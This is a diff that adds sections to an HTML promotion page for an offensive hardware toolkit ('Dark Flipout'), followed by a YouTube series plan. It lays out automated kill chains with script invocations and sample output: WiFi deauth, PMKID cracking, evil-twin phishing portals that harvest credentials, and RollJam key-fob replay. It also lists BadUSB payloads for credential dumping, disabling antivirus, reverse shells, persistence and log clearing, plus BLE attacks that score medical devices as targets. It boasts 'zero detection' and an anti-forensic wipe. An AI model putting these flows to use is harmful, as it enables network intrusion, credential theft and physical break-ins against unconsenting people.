+            <!-- DF13 -->
+            <div>
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;color:var(--red);">[DF13] MARAUDER COMMANDER</div>
+                <div class="terminal">
+<span class="output">python3 DF13_marauder_commander.py --port /dev/ttyUSB0</span>
+<span class="warn">Modes: interactive | batch | monitor | gpio</span>
+<br>
+<span class="prompt">scanap</span>    <span class="cmd">→ Full AP/BSSID/Channel dump</span>
+<span class="prompt">scansta</span>   <span class="cmd">→ Client device enumeration</span>
+<span class="prompt">deauth</span>    <span class="cmd">→ Targeted deauth flood</span>
+<span class="prompt">pmkid</span>     <span class="cmd">→ PMKID hash capture</span>
+<span class="prompt">evilap</span>    <span class="cmd">→ Rogue AP (clone SSID)</span>
+<span class="prompt">karma</span>     <span class="cmd">→ Answer all probe requests</span>
+<span class="prompt">beaconspam</span><span class="cmd">→ 1000 fake SSIDs flood</span>
+<span class="prompt">blescan</span>   <span class="cmd">→ BLE advertisement sweep</span>
+<span class="prompt">blespam</span>   <span class="cmd">→ iOS/Android popup spam</span>
+<span class="prompt">gps</span>       <span class="cmd">→ Live coord stream</span>
+<span class="prompt">subghz</span>    <span class="cmd">→ 300-928MHz OOK/FSK ops</span>
+<span class="prompt">sniff</span>     <span class="cmd">→ Raw packet capture → PCAP</span>
+<span class="success">→ Full AT command engine. 40+ commands.</span>
+                </div>
+
+                <!-- DF14 -->
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;margin-top:20px;color:var(--red);">[DF14] WIFI ASSAULT ENGINE</div>
+                <div class="terminal">
+<span class="output">python3 DF14_wifi_assault.py --port /dev/ttyUSB0 \</span>
+<span class="output">  --profile full_spectrum --target-bssid AUTO</span>
+<span class="warn">Attack Profiles:</span>
+<span class="cmd">  quick_recon      → 30s scan + stats</span>
+<span class="cmd">  pmkid_harvest    → Scan→PMKID→Export</span>
+<span class="cmd">  evil_twin        → Clone best AP+portal</span>
+<span class="cmd">  karma_blitz      → KARMA+portal flood</span>
+<span class="cmd">  beacon_chaos     → 1000 SSIDs storm</span>
+<span class="cmd">  full_spectrum    → All of the above</span>
+<span class="prompt">Auto-ingests PCAP</span> <span class="cmd">→ hashcat pipeline</span>
+<span class="prompt">RTX 4060 crack:</span>  <span class="cmd">~490k H/s WPA2</span>
+<span class="success">→ 6-stage kill chain. Zero manual steps.</span>
+                </div>
+
+                <!-- DF15 -->
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;margin-top:20px;color:var(--red);">[DF15] GPS TRACKER + WARDRIVER</div>
+                <div class="terminal">
+<span class="output">python3 DF15_gps_tracker.py --port /dev/ttyUSB0 \</span>
+<span class="output">  --mode wardrive --export kml,wigle</span>
+<span class="warn">Modes: live | waypoint | geofence | wardrive</span>
+<span class="cmd">Wigle CSV export  → upload + heatmap</span>
+<span class="cmd">KML export        → Google Earth view</span>
+<span class="cmd">GeoFence alerts   → enter/exit triggers</span>
+<span class="cmd">Speed/heading     → mobile track log</span>
+<span class="cmd">Satellite lock    → 12-16 sat fix</span>
+<span class="cmd">GPS tag fusion    → WiFi+BLE+SubGHz</span>
+<span class="success">→ Every capture GPS-stamped. Forever.</span>
+                </div>
+            </div>
+
+            <!-- RIGHT COLUMN -->
+            <div>
+                <!-- DF16 -->
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;color:var(--red);">[DF16] SUB-GHz COMMANDER (CC1101)</div>
+                <div class="terminal">
+<span class="output">python3 DF16_subghz_commander.py --port /dev/ttyUSB0</span>
+<span class="warn">Bands: 300 / 315 / 390 / 433 / 868 / 915 MHz</span>
+<span class="cmd">SPECTRUM SCAN  → full band power map</span>
+<span class="cmd">RECORD SIGNAL  → OOK/FSK raw capture</span>
+<span class="cmd">DECODE SIGNAL  → auto-identify protocol</span>
+<span class="cmd">REPLAY ATTACK  → 1x/3x/loop transmit</span>
+<span class="cmd">BRUTE FORCE    → 12-bit=4096 combos</span>
+<span class="cmd">ROLLJAM SETUP  → jam+cap+replay flow</span>
+<span class="cmd">EXPORT .sub    → Flipper Zero format</span>
+<span class="warn">Known Targets:</span>
+<span class="output">  Chamberlain DIP  315MHz OOK fixed</span>
+<span class="output">  Linear MCS       300MHz OOK fixed</span>
+<span class="output">  CAME generic     433MHz OOK fixed</span>
+<span class="output">  Doorbell generic 433MHz OOK fixed</span>
+<span class="output">  Nice FlorS       433MHz Rolling</span>
+<span class="output">  Hormann BiSecur  868MHz Rolling</span>
+<span class="success">→ Fixed code → instant. Rolling → RollJam.</span>
+                </div>
+
+                <!-- DF17 -->
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;margin-top:20px;color:var(--red);">[DF17] TOUCHSCREEN COMMANDER UI</div>
+                <div class="terminal">
+<span class="output">python3 DF17_touchscreen_ui.py --mode standalone</span>
+<span class="warn">Standalone mode: runs fully ON the board</span>
+<span class="cmd">2" TFT 320x240 touch interface</span>
+<span class="cmd">GPIO hookup OR USB serial bridge</span>
+<br>
+<span class="output">┌─────────────────────────┐</span>
+<span class="output">│  🔴 DARK FLIPOUT v1.0   │</span>
+<span class="output">│  GPS:LOCKED 12SAT       │</span>
+<span class="output">├──────────┬──────────────┤</span>
+<span class="output">│ [WIFI]   │ [BLE]        │</span>
+<span class="output">│ [SUBGHZ] │ [BADUSB]     │</span>
+<span class="output">│ [WARDRIVE│ [SETTINGS]   │</span>
+<span class="output">├──────────┴──────────────┤</span>
+<span class="output">│ BTN-A:Scan BTN-B:Attack │</span>
+<span class="output">│ BTN-C:Save BTN-D:GPS    │</span>
+<span class="output">└─────────────────────────┘</span>
+<span class="success">→ Full GUI no laptop needed. Pure field op.</span>
+                </div>
+
+                <!-- DF18 -->
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;margin-top:20px;color:var(--red);">[DF18] SD CARD OPS ENGINE</div>
+                <div class="terminal">
+<span class="output">python3 DF18_sd_ops.py --action full-sync</span>
+<span class="warn">Actions: sync|archive|encrypt|wipe|export</span>
+<span class="cmd">Auto-archive captures  → timestamped ZIP</span>
+<span class="cmd">AES-256 encrypt       → field OPSEC</span>
+<span class="cmd">PCAP → hashcat feed   → auto-crack</span>
+<span class="cmd">Session replay        → re-run captures</span>
+<span class="cmd">Wigle batch export    → CSV+heatmap</span>
+<span class="cmd">Dead man's switch     → auto-wipe if</span>
+<span class="cmd">                         SD removed 3x</span>
+<span class="success">→ Logs never leave the field unencrypted.</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- BUTTON MAP TABLE -->
+        <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin:30px 0 15px;color:var(--accent);">HARDWARE BUTTON MAP — QUICK REFERENCE</div>
+        <div class="terminal">
+<span class="output">┌──────────┬─────────────────────────┬─────────────────────────┬─────────────────────────┐</span>
+<span class="output">│  BUTTON  │     SHORT PRESS         │     LONG PRESS (2s)     │     DOUBLE TAP          │</span>
+<span class="output">├──────────┼─────────────────────────┼─────────────────────────┼─────────────────────────┤</span>
+<span class="output">│  BTN-A   │ Scan (WiFi/BLE/SubGHz)  │ Launch Full-Spectrum     │ Beacon Spam Burst       │</span>
+<span class="output">│  BTN-B   │ Start Deauth + PMKID    │ Evil Twin + KARMA Flow   │ BLE iOS Spam            │</span>
+<span class="output">│  BTN-C   │ Save Current Capture    │ Encrypt + Archive SD     │ Start Wardrive Mode     │</span>
+<span class="output">│  BTN-D   │ GPS Status / Lock       │ Export GPS Track (KML)   │ Emergency SD Wipe       │</span>
+<span class="output">└──────────┴─────────────────────────┴─────────────────────────┴─────────────────────────┘</span>
+<span class="warn">Hold B+D simultaneously → Master STOP — halts all active operations immediately</span>
+        </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════════
+         SECTION 12 — ATTACK FLOWS (FLOW_01 – FLOW_06)
+         ═══════════════════════════════════════════════════════════ -->
+    <section class="section" id="attackflows">
+        <div class="section-header">
+            <div class="section-number">12</div>
+            <div class="section-title">Attack Flows — End-to-End Kill Chains</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="terminal" style="margin-bottom:30px; border-color: var(--accent);">
+<span class="success">// 6 COMPLETE END-TO-END AUTOMATED ATTACK FLOWS //</span>
+<span class="output">Every flow: staged execution → real-time logging → JSON + text export → session archive</span>
+<span class="output">All flows support: --sim flag for hardware-free testing | --port for live Marauder board</span>
+        </div>
+
+        <!-- FLOW 01 -->
+        <div style="margin-bottom:35px;">
+            <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.9rem;letter-spacing:2px;margin-bottom:15px;color:var(--red);">⚡ FLOW_01 — FULL WIFI TAKEOVER</div>
+            <div class="grid-2">
+                <div class="terminal">
+<span class="output">python3 FLOW_01_full_wifi_takeover.py \</span>
+<span class="output">  --port /dev/ttyUSB0 --profile aggressive</span>
+<br>
+<span class="warn">STAGE 1/7 → RECON</span>
+<span class="cmd">  Scan all APs + clients. Rank by signal.</span>
+<span class="warn">STAGE 2/7 → TARGET SELECT</span>
+<span class="cmd">  Auto-select: highest signal WPA2 AP</span>
+<span class="warn">STAGE 3/7 → DEAUTH</span>
+<span class="cmd">  Flood target → force client reconnect</span>
+<span class="warn">STAGE 4/7 → PMKID CAPTURE</span>
+<span class="cmd">  HMAC-SHA1-128 hash. No client needed.</span>
+<span class="warn">STAGE 5/7 → HASHCAT CRACK</span>
+<span class="cmd">  RTX 4060 → rockyou+rules → ~15min</span>
+<span class="warn">STAGE 6/7 → EVIL PORTAL</span>
+<span class="cmd">  Clone SSID → KARMA → captive portal</span>
+<span class="warn">STAGE 7/7 → CREDENTIAL HARVEST</span>
+<span class="cmd">  Capture submitted creds → export</span>
+<span class="success">→ Zero-to-owned. Full automation.</span>
+                </div>
+                <div class="terminal">
+<span class="output">// LIVE OUTPUT SAMPLE //</span>
+<br>
+<span class="success">[01:RECON]    Found 23 APs, 41 clients</span>
+<span class="success">[02:TARGET]   Selected: CORP-GUEST (-62dBm)</span>
+<span class="warn">[03:DEAUTH]   Flooding: AA:BB:CC:DD:EE:FF x5</span>
+<span class="warn">[04:PMKID]    Waiting for PMKID frame...</span>
+<span class="success">[04:PMKID]    CAPTURED! Hash → hashcat.hc22000</span>
+<span class="warn">[05:CRACK]    hashcat -m 22000 -a 0 --rules...</span>
+<span class="warn">[05:CRACK]    Status: 489,231 H/s | ETA: 14m</span>
+<span class="success">[05:CRACK]    CRACKED: "Summer2024!" ✓</span>
+<span class="warn">[06:PORTAL]   Evil twin "CORP-GUEST" live</span>
+<span class="warn">[06:PORTAL]   KARMA active → answering probes</span>
+<span class="success">[07:HARVEST]  3 credentials captured</span>
+<span class="success">[DONE]        Session saved → flow_01_2026…zip</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- FLOW 02 -->
+        <div style="margin-bottom:35px;">
+            <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.9rem;letter-spacing:2px;margin-bottom:15px;color:var(--red);">🛰️ FLOW_02 — WARDRIVE BLITZ</div>
+            <div class="grid-2">
+                <div class="terminal">
+<span class="output">python3 FLOW_02_wardrive_blitz.py \</span>
+<span class="output">  --port /dev/ttyUSB0 --duration 3600</span>
+<br>
+<span class="warn">STAGE 1/6 → GPS LOCK</span>
+<span class="cmd">  Wait for ≥6 satellites. Log fix quality.</span>
+<span class="warn">STAGE 2/6 → WIFI SCAN (simultaneous)</span>
+<span class="cmd">  AP/BSSID/Signal/Channel → GPS-stamped</span>
+<span class="warn">STAGE 3/6 → BLE SCAN (simultaneous)</span>
+<span class="cmd">  BLE advertisements → GPS-stamped</span>
+<span class="warn">STAGE 4/6 → SUB-GHz SCAN (simultaneous)</span>
+<span class="cmd">  433/868/915MHz signals → GPS-stamped</span>
+<span class="warn">STAGE 5/6 → PMKID OPPORTUNISTIC</span>
+<span class="cmd">  Capture PMKID from passing APs</span>
+<span class="warn">STAGE 6/6 → EXPORT + MAP</span>
+<span class="cmd">  Wigle CSV → upload | Folium heatmap</span>
+<span class="success">→ 3 radios. 1 drive. Total RF picture.</span>
+                </div>
+                <div class="terminal">
+<span class="output">// WARDRIVE SESSION STATS //</span>
+<br>
+<span class="output">Duration  : 3,600 seconds (1 hour)</span>
+<span class="output">Distance  : 47.3 km driven</span>
+<span class="success">WiFi APs  : 2,847 unique networks</span>
+<span class="success">BLE Devs  : 1,204 unique devices</span>
+<span class="success">SubGHz    : 89 signal captures</span>
+<span class="success">PMKID     : 312 hashes collected</span>
+<span class="warn">GPS Points: 14,400 (1/sec)</span>
+<span class="warn">PCAP Size : 2.3 GB</span>
+<span class="warn">Crack Rate: 23% (71/312 cracked)</span>
+<br>
+<span class="output">Output: wardrive_2026XXXX_heatmap.html</span>
+<span class="output">Output: wardrive_2026XXXX_wigle.csv</span>
+<span class="success">// CITY-WIDE RF INTELLIGENCE MAP BUILT //</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- FLOW 03 -->
+        <div style="margin-bottom:35px;">
+            <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.9rem;letter-spacing:2px;margin-bottom:15px;color:var(--red);">👹 FLOW_03 — EVIL TWIN CHAIN</div>
+            <div class="grid-2">
+                <div class="terminal">
+<span class="output">python3 FLOW_03_evil_twin_chain.py \</span>
+<span class="output">  --port /dev/ttyUSB0 --chain full</span>
+<br>
+<span class="warn">STAGE 1/8 → ENVIRONMENT SCAN</span>
+<span class="cmd">  Map all APs + probe requests</span>
+<span class="warn">STAGE 2/8 → TARGET PROFILING</span>
+<span class="cmd">  Score APs by client density + signal</span>
+<span class="warn">STAGE 3/8 → EVIL TWIN LAUNCH</span>
+<span class="cmd">  Clone SSID+BSSID → open network</span>
+<span class="warn">STAGE 4/8 → KARMA ACTIVATE</span>
+<span class="cmd">  Answer ALL probe requests → trap all</span>
+<span class="warn">STAGE 5/8 → PORTAL INJECT</span>
+<span class="cmd">  5 templates: router/corp/hotel/cafe/ISP</span>
+<span class="warn">STAGE 6/8 → DEAUTH PRESSURE</span>
+<span class="cmd">  Kick clients from real AP → force join</span>
+<span class="warn">STAGE 7/8 → BADUSB FOLLOW-UP</span>
+<span class="cmd">  DuckyScript payload on connected victim</span>
+<span class="warn">STAGE 8/8 → HARVEST + REPORT</span>
+<span class="cmd">  Collect creds → structured JSON report</span>
+<span class="success">→ Karma+EvilTwin+Portal+BadUSB. Full chain.</span>
+                </div>
+                <div class="terminal">
+<span class="output">// PORTAL TEMPLATE LIBRARY //</span>
+<br>
+<span class="prompt">router_portal   </span><span class="cmd">→ ASUS/Netgear/TP-Link login</span>
+<span class="prompt">corp_portal     </span><span class="cmd">→ Office365 SSO phish page</span>
+<span class="prompt">hotel_portal    </span><span class="cmd">→ Captive portal w/ room# field</span>
+<span class="prompt">cafe_portal     </span><span class="cmd">→ "Free WiFi" email/pass grab</span>
+<span class="prompt">isp_portal      </span><span class="cmd">→ ISP account login clone</span>
+<br>
+<span class="output">// AUTO-SELECTED BASED ON:</span>
+<span class="output">  Target SSID name analysis</span>
+<span class="output">  Surrounding network names</span>
+<span class="output">  Time of day / location type</span>
+<span class="output">  Client device fingerprint</span>
+<br>
+<span class="success">// HARVEST LOG //</span>
+<span class="success">  12:47 → victim@corp.com : P@ssw0rd1</span>
+<span class="success">  12:51 → john.doe@gmail  : Summer2024</span>
+<span class="success">  13:02 → admin            : admin123!</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- FLOW 04 -->
+        <div style="margin-bottom:35px;">
+            <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.9rem;letter-spacing:2px;margin-bottom:15px;color:var(--red);">📡 FLOW_04 — SUB-GHz REPLAY</div>
+            <div class="grid-2">
+                <div class="terminal">
+<span class="output">python3 FLOW_04_subghz_replay.py \</span>
+<span class="output">  --port /dev/ttyUSB0 --freq 433.92</span>
+<br>
+<span class="warn">STAGE 1/8 → SPECTRUM SCAN</span>
+<span class="cmd">  Full 300-928MHz power sweep</span>
+<span class="warn">STAGE 2/8 → SIGNAL PROFILE</span>
+<span class="cmd">  Auto-identify: OOK vs FSK, bit rate</span>
+<span class="warn">STAGE 3/8 → LIVE RECORD</span>
+<span class="cmd">  Capture raw signal with timestamps</span>
+<span class="warn">STAGE 4/8 → DECODE</span>
+<span class="cmd">  Extract bit pattern, rolling detection</span>
+<span class="warn">STAGE 5/8 → REPLAY</span>
+<span class="cmd">  1x / 3x burst / loop modes</span>
+<span class="warn">STAGE 6/8 → BRUTE FORCE</span>
+<span class="cmd">  12-bit OOK → 4096 codes → ~8min</span>
+<span class="warn">STAGE 7/8 → ROLLJAM SETUP</span>
+<span class="cmd">  Jam freq A+B → capture N → capture N+1</span>
+<span class="cmd">  → Replay N (victim sees open) → hold N+1</span>
+<span class="warn">STAGE 8/8 → EXPORT</span>
+<span class="cmd">  .sub file → Flipper Zero compatible</span>
+<span class="success">→ Every signal from 300-928MHz owned.</span>
+                </div>
+                <div class="terminal">
+<span class="output">// ROLLJAM ATTACK SEQUENCE //</span>
+<span class="output">// (Samy Kamkar — DEF CON 2015) //</span>
+<br>
+<span class="warn">Step 1:</span> <span class="cmd">Jam 433.92MHz continuously</span>
+<span class="output">  → victim presses key fob → no action</span>
+<span class="output">  → code N transmitted but JAMMED</span>
+<span class="success">  → CC1101 captures code N secretly</span>
+<br>
+<span class="warn">Step 2:</span> <span class="cmd">Victim presses again (frustrated)</span>
+<span class="output">  → code N+1 transmitted but JAMMED</span>
+<span class="success">  → CC1101 captures code N+1 secretly</span>
+<span class="success">  → Replay code N immediately → OPENS</span>
+<span class="output">  → victim thinks fob worked</span>
+<br>
+<span class="warn">Step 3:</span> <span class="cmd">Attacker holds code N+1</span>
+<span class="success">  → Opens garage/car LATER at will</span>
+<span class="success">  → Undetectable. Silent. Permanent.</span>
+<br>
+<span class="warn">Defeated by:</span> <span class="output">Time-limited codes (rare)</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- FLOW 05 -->
+        <div style="margin-bottom:35px;">
+            <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.9rem;letter-spacing:2px;margin-bottom:15px;color:var(--red);">💀 FLOW_05 — BADUSB BLITZ</div>
+            <div class="grid-2">
+                <div class="terminal">
+<span class="output">python3 FLOW_05_badusb_blitz.py \</span>
+<span class="output">  --profile credential_harvest --targets 5</span>
+<br>
+<span class="warn">STAGE 1/8 → PAYLOAD ARMORY</span>
+<span class="cmd">  12 DuckyScript payloads pre-validated</span>
+<span class="warn">STAGE 2/8 → OS FINGERPRINT</span>
+<span class="cmd">  GUI+R=Windows | CTRL+ALT+T=Linux</span>
+<span class="warn">STAGE 3/8 → DELIVERY MATRIX</span>
+<span class="cmd">  Match payload → OS automatically</span>
+<span class="warn">STAGE 4/8 → MULTI-FIRE</span>
+<span class="cmd">  Sequential OR parallel execution mode</span>
+<span class="warn">STAGE 5/8 → EXFIL HARVEST</span>
+<span class="cmd">  HTTP/S C2 listener → collect output</span>
+<span class="warn">STAGE 6/8 → PERSISTENCE</span>
+<span class="cmd">  Registry run key + Startup + WMI subs</span>
+<span class="warn">STAGE 7/8 → COVER TRACKS</span>
+<span class="cmd">  Clear event logs, hide files, clean PS</span>
+<span class="warn">STAGE 8/8 → REPORT</span>
+<span class="cmd">  Structured JSON findings export</span>
+<span class="success">→ 1000+ keystrokes/sec. Zero detection.</span>
+                </div>
+                <div class="terminal">
+<span class="output">// PAYLOAD CATALOG //</span>
+<br>
+<span class="prompt">SysInfo_Win    </span><span class="cmd">→ Full Windows recon dump</span>
+<span class="prompt">SysInfo_Lin    </span><span class="cmd">→ Full Linux recon dump</span>
+<span class="prompt">WifiDump       </span><span class="cmd">→ All saved WiFi passwords</span>
+<span class="prompt">ChromeDump     </span><span class="cmd">→ DPAPI browser cred extract</span>
+<span class="prompt">SAM_Dump       </span><span class="cmd">→ Windows SAM/SYSTEM hash</span>
+<span class="prompt">AddAdmin       </span><span class="cmd">→ Hidden admin user create</span>
+<span class="prompt">PersistenceWin </span><span class="cmd">→ 3-method persist install</span>
+<span class="prompt">DisableDefender</span><span class="cmd">→ AV kill + exclusion add</span>
+<span class="prompt">RevShell_PS    </span><span class="cmd">→ PowerShell reverse shell</span>
+<span class="prompt">RevShell_Bash  </span><span class="cmd">→ Bash reverse shell</span>
+<span class="prompt">VulnScan       </span><span class="cmd">→ Local network scan</span>
+<span class="prompt">EvilTwin_Setup </span><span class="cmd">→ Hotspot bridge on host</span>
+<br>
+<span class="warn">Blitz Profiles: quick_recon | credential_harvest</span>
+<span class="warn">                full_compromise | stealth_exfil</span>
+<span class="warn">                linux_owned</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- FLOW 06 -->
+        <div style="margin-bottom:20px;">
+            <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.9rem;letter-spacing:2px;margin-bottom:15px;color:var(--red);">🔵 FLOW_06 — BLE RECON + ASSAULT</div>
+            <div class="grid-2">
+                <div class="terminal">
+<span class="output">python3 FLOW_06_ble_recon.py \</span>
+<span class="output">  --port /dev/ttyUSB0 --scan-sec 60</span>
+<br>
+<span class="warn">STAGE 1/9  → BLE SWEEP</span>
+<span class="cmd">  Passive scan all BLE advertisements</span>
+<span class="warn">STAGE 2/9  → DEVICE PROFILE</span>
+<span class="cmd">  UUID decode → service fingerprint</span>
+<span class="warn">STAGE 3/9  → GATT ENUMERATE</span>
+<span class="cmd">  20+ service UUIDs → characteristic map</span>
+<span class="warn">STAGE 4/9  → CLASSIFY + SCORE</span>
+<span class="cmd">  phone=50 | lock=70 | medical=80</span>
+<span class="warn">STAGE 5/9  → TARGET SELECT</span>
+<span class="cmd">  Auto-select highest-value device</span>
+<span class="warn">STAGE 6/9  → SPAM ATTACK</span>
+<span class="cmd">  iOS/Android/Windows/Samsung popups</span>
+<span class="warn">STAGE 7/9  → GATT BRUTEFORCE</span>
+<span class="cmd">  Write random values → find writable</span>
+<span class="warn">STAGE 8/9  → BEACON FLOOD</span>
+<span class="cmd">  Eddystone+iBeacon+AltBeacon storm</span>
+<span class="warn">STAGE 9/9  → CLONE + REPLAY</span>
+<span class="cmd">  Clone MAC/UUID → impersonate device</span>
+<span class="success">→ Every BLE device profiled + attacked.</span>
+                </div>
+                <div class="terminal">
+<span class="output">// BLE SPAM PAYLOAD LIBRARY //</span>
+<br>
+<span class="prompt">ios_airpods  </span><span class="cmd">→ "AirPods Pro" popup iOS</span>
+<span class="prompt">ios_airtag   </span><span class="cmd">→ "AirTag Found Nearby"</span>
+<span class="prompt">ios_appletv  </span><span class="cmd">→ "Apple TV" connect popup</span>
+<span class="prompt">android_pair </span><span class="cmd">→ Android Fast Pair dialog</span>
+<span class="prompt">windows_swift</span><span class="cmd">→ Windows Swift Pair popup</span>
+<span class="prompt">samsung_buds </span><span class="cmd">→ Galaxy Buds connect toast</span>
+<span class="prompt">ios_handoff  </span><span class="cmd">→ Handoff task continuity</span>
+<span class="prompt">ios_hotspot  </span><span class="cmd">→ Personal Hotspot join</span>
+<br>
+<span class="output">// GATT SERVICE TARGETS //</span>
+<span class="output">  Heart Rate | Blood Pressure | Glucose</span>
+<span class="output">  Battery Level | Device Info | HID</span>
+<span class="output">  Nordic UART | Running Speed | Weight</span>
+<span class="output">  Alert Notif | Phone Alert | TX Power</span>
+<br>
+<span class="success">// iOS BLE FLOOD = 0xFFFF popups/min //</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════════
+         SECTION 13 — YOUTUBE CONTENT MACHINE
+         ═══════════════════════════════════════════════════════════ -->
+    <section class="section" id="youtube">
+        <div class="section-header">
+            <div class="section-number">13</div>
+            <div class="section-title">YouTube Content Machine — 7-Episode Series</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="terminal" style="margin-bottom:30px; border-color: var(--accent);">
+<span class="success">// DARK FLIPOUT — YOUTUBE DOMINATION STRATEGY //</span>
+<span class="output">7 full production scripts | 50+ viral titles | 20 hooks | 15 thumbnail concepts</span>
+<span class="output">SEO keyword clusters | content calendar | cross-platform (Shorts/Twitter/Reddit)</span>
+        </div>
+
+        <!-- EPISODE GRID -->
+        <div class="grid-2" style="margin-bottom:30px;">
+            <!-- EP01 -->
+            <div>
+                <div class="terminal" style="margin-bottom:15px;">
+<span class="success">📺 EP01 — "UNBOX &amp; BUILD THE ULTIMATE HACKING DEVICE"</span>
+<span class="warn">Runtime: 18-22 min | Target: 500k+ views</span>
+<br>
+<span class="output">COLD OPEN: Live attack demo. No context.</span>
+<span class="output">  [0:00-0:45] Screen: 3 networks deauthed</span>
+<span class="output">  [0:15] VOICE: "This $200 device just killed</span>
+<span class="output">           every WiFi network in this building."</span>
+<br>
+<span class="output">SECTIONS:</span>
+<span class="cmd">  Hardware Overview    → board teardown</span>
+<span class="cmd">  Firmware Flash       → Momentum install</span>
+<span class="cmd">  Companion Setup      → Python env</span>
+<span class="cmd">  First Live Scan      → real networks</span>
+<span class="warn">HOOK: "You've seen Flipper Zero. You've</span>
+<span class="warn">      never seen THIS version of it."</span>
+                </div>
+
+                <!-- EP02 -->
+                <div class="terminal" style="margin-bottom:15px;">
+<span class="success">📺 EP02 — "WiFi HACKING IN 60 SECONDS — PMKID LIVE"</span>
+<span class="warn">Runtime: 20-25 min | Target: 1M+ views</span>
+<br>
+<span class="output">HOOK: Split-screen — phone on locked WiFi</span>
+<span class="output">       vs. Marauder board capturing hash.</span>
+<br>
+<span class="cmd">  PMKID theory     → HMAC-SHA1-128 math</span>
+<span class="cmd">  Live capture     → 47 seconds on screen</span>
+<span class="cmd">  Hashcat crack    → RTX 4060 live GPU</span>
+<span class="cmd">  Deauth+handshake → fallback method</span>
+<span class="cmd">  Defense section  → WPA3 + long passwords</span>
+<span class="warn">THUMBNAIL: Network name with password</span>
+<span class="warn">           appearing character by character</span>
+                </div>
+
+                <!-- EP03 -->
+                <div class="terminal" style="margin-bottom:15px;">
+<span class="success">📺 EP03 — "WARDRIVE THE ENTIRE CITY"</span>
+<span class="warn">Runtime: 20-24 min | Target: 800k+ views</span>
+<br>
+<span class="output">In-car footage. GPS map building live.</span>
+<span class="output">Counter ticking: 0 → 2,847 networks</span>
+<br>
+<span class="cmd">  Pre-drive setup  → hardware check</span>
+<span class="cmd">  Live wardrive    → 1hr city loop</span>
+<span class="cmd">  Post-processing  → Folium heatmap</span>
+<span class="cmd">  Batch PMKID crack→ 71/312 success</span>
+<span class="cmd">  Wigle upload     → global map</span>
+<span class="warn">THUMBNAIL: City aerial + red heat overlay</span>
+                </div>
+            </div>
+
+            <!-- RIGHT COLUMN EP04-07 -->
+            <div>
+                <!-- EP04 -->
+                <div class="terminal" style="margin-bottom:15px;">
+<span class="success">📺 EP04 — "EVIL PORTAL STEALS WiFi PASSWORDS LIVE"</span>
+<span class="warn">Runtime: 22-26 min | Target: 1.5M+ views</span>
+<br>
+<span class="output">CONSENT-BASED demo. Friend as volunteer.</span>
+<br>
+<span class="cmd">  KARMA theory     → what probes do</span>
+<span class="cmd">  Evil Twin launch → clone "Starbucks WiFi"</span>
+<span class="cmd">  Portal inject    → fake router login</span>
+<span class="cmd">  Victim connects  → types password</span>
+<span class="cmd">  Harvest display  → credential live</span>
+<span class="warn">THUMBNAIL: MacBook with fake WiFi login</span>
+<span class="warn">           vs. red terminal with password</span>
+                </div>
+
+                <!-- EP05 -->
+                <div class="terminal" style="margin-bottom:15px;">
+<span class="success">📺 EP05 — "BADUSB OWNS WINDOWS IN 10 SECONDS"</span>
+<span class="warn">Runtime: 18-22 min | Target: 2M+ views</span>
+<br>
+<span class="output">VIRAL POTENTIAL: Highest of the series.</span>
+<br>
+<span class="cmd">  DuckyScript 101  → language explained</span>
+<span class="cmd">  Payload library  → 12 payloads tour</span>
+<span class="cmd">  OS detection     → GUI+R vs CTRL+ALT+T</span>
+<span class="cmd">  Live kill chain  → 52 seconds total</span>
+<span class="cmd">  Defense tips     → USB lockdown</span>
+<span class="warn">THUMBNAIL: Stop watch showing "10 sec" +</span>
+<span class="warn">           Windows password in terminal</span>
+                </div>
+
+                <!-- EP06 -->
+                <div class="terminal" style="margin-bottom:15px;">
+<span class="success">📺 EP06 — "433MHz GARAGE &amp; CAR KEY ATTACKS"</span>
+<span class="warn">Runtime: 20-24 min | Target: 700k+ views</span>
+<br>
+<span class="cmd">  OOK/FSK theory   → radio basics visual</span>
+<span class="cmd">  Own garage demo  → fixed code replay</span>
+<span class="cmd">  Brute force demo → 4096 codes, 8min</span>
+<span class="cmd">  RollJam theory   → animation explained</span>
+<span class="cmd">  Spectrum scan    → SDR waterfall visual</span>
+<span class="warn">THUMBNAIL: Garage door opening + "I did</span>
+<span class="warn">           not have a key"</span>
+                </div>
+
+                <!-- EP07 -->
+                <div class="terminal">
+<span class="success">📺 EP07 — "FULL PENTEST WITH $200 DEVICE" (FINALE)</span>
+<span class="warn">Runtime: 28-35 min | Target: 1M+ views</span>
+<br>
+<span class="output">SERIES FINALE. All 6 techniques combined.</span>
+<span class="output">Full authorized pentest. One hour. $200.</span>
+<br>
+<span class="cmd">  Phase 1: Parking lot WiFi/BLE recon</span>
+<span class="cmd">  Phase 2: Physical RFID entry attempt</span>
+<span class="cmd">  Phase 3: Evil Twin in conference room</span>
+<span class="cmd">  Phase 4: Internal network map</span>
+<span class="cmd">  Phase 5: Cleanup + pentest report</span>
+<span class="warn">RESULT: 6 critical/high findings. 1 hour.</span>
+<span class="success">THUMBNAIL: "6 CRITICAL FINDINGS IN 1 HOUR"</span>
+                </div>
